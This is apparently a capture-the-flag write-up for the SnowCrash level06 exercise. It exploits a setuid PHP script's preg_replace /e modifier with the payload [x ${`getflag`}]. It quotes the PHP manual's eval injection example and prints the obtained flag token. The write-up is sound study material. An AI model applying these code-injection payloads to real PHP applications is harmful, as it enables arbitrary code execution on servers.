guest:

level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

level06@SnowCrash:~$ ./level06.php
PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5
PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4


level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

----------------------------------------

https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php 

**Caution**
Use of this modifier is discouraged, as it can easily introduce remote code execution vulnerabilities. To prevent these, the `preg_replace_callback()` function should be used instead:

```php
<?php
$html = $_POST['html'];

// uppercase headings
$html = preg_replace_callback(
    '(<h([1-6])>(.*?)</h\1>)',
    function ($m) {
        return "<h$m[1]>" . strtoupper($m[2]) . "</h$m[1]>";
    },
    $html
);
```

If the above example was written with preg_replace() and the e modifier, the code could be easily exploited by passing in a string such as `<h1>{${eval($_GET[php_code])}}</h1>`. This gave the attacker the ability to execute arbitrary PHP code and as such gave them nearly complete access to the server.

------------------------------------------

level06.php in readable tabulation:

#!/usr/bin/php
<?php
function y($m)
{
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
}

function x($y, $z)
{
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a);
        $a = preg_replace("/\]/", ")", $a);
        return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

------------------

https://regex101.com/ 

"/(\[x (.*)\])/e" => [x ${`everything_what_we_want_send_in_bash`}]

--------------------

guest:

level06@SnowCrash:~$ vim /tmp/myflag06

level06@SnowCrash:~$ cat /tmp/myflag06
[x ${`getflag`}]

level06@SnowCrash:~$ ./level06 /tmp/myflag06 any_text_or_numbers_like_argv[2]
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1


level06@SnowCrash:~$ su level07
Password:
level07@SnowCrash:~$